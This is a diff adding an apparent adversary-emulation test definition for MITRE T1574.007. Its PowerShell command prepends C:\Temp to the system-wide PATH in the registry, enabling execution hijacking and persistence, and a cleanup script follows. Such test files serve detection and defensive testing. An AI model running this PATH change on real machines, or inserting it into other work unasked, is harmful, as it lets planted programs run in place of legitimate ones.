@@ -1,0 +1,30 @@
+attack_technique: T1574.007
+display_name: 'Hijack Execution Flow Path Interception by PATH Environment Variable'
+atomic_tests:
+- name: powerShell Persistence via hijacking default modules - PATH
+  auto_generated_guid: 1561de08-0b4b-498e-8261-e922f3494aa1
+  description: |
+    none
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+        $oldPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).Path
+        $newPath = 'C:\Temp;' + $oldPath
+        Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Value $newPath
+        
+    Cleanup_command: |
+        $Environment = [System.Environment]::GetEnvironmentVariable("Path", "Machine")
+        foreach ($path in ($Environment).Split(";"))
+            {
+            if ($path -like "*C:\Temp*")
+                {
+                $Environment = $Environment.Replace($Path ,"")
+                }
+            if ($path -like "*c:\temp*")
+                {
+                $Environment = $Environment.Replace($Path ,"")
+                }
+            }
+        [System.Environment]::SetEnvironmentVariable("Path", $Environment, "Machine")
+    name: powershell
